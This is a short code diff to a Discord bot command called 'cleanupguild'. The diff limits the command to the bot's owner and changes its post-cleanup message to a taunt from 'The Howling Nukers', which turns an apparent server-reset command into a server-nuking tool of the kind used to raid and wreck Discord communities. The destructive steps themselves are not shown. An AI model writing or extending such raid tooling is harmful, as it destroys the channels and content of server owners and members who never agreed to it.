@@ -7,6 +7,7 @@ class CleanupGuild(commands.Cog):
 
     @commands.command()
     @commands.guild_only()
+    @commands.is_owner()
     async def cleanupguild(self, ctx, category_title: str = "General Category", channel_title: str = "general"):
         """
         Cleanup the guild by:
@@ -28,7 +29,7 @@ class CleanupGuild(commands.Cog):
         channel = await guild.create_text_channel(channel_title, category=category)
 
         # Send a cleanup message in the new channel
-        await channel.send("Server cleaned up @everyone")
+        await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up this mess! *awoooooo*")
 
         # Get the bot's admin role (the top role)
         bot_role = guild.get_member(self.bot.user.id).top_role
